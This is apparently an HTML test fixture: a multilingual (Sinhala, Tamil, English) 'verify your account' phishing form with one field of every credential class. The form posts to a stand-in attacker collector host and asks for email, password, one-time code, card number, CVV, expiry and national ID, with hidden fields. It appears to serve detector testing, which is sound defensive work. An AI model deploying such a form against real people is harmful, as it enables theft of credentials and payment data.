<!doctype html>
<html lang="si">
<head><title>ගිණුම තහවුරු කරන්න</title></head>
<body>
<!-- Part 3 test page: one field of every credential class, in English, Sinhala and Tamil. -->
<form id="login" action="https://collector.attacker.test/post.php" method="post">
  <label for="em">ඊමේල් ලිපිනය</label> <input id="em" name="f1" type="text">
  <label for="us">பயனர் பெயர்</label> <input id="us" name="f2" type="text">
  <label for="pw">මුරපදය</label> <input id="pw" name="f3" type="password">
  <input name="otp" type="text" autocomplete="one-time-code">
  <input name="cardno" type="tel" placeholder="Card number">
  <input name="cvv" type="text">
  <input name="exp" type="text" placeholder="MM / YY">
  <input name="nic" type="text" placeholder="National Identity Card Number">
  <input name="captcha" type="text" placeholder="Enter verification code (captcha)">
  <input name="track" type="hidden" value="x">
  <input name="remember_email" type="checkbox">
  <input name="note" type="text" style="display:none">
  <button>Continue</button>
</form>
<input name="extra_email" type="email">
</body>
</html>
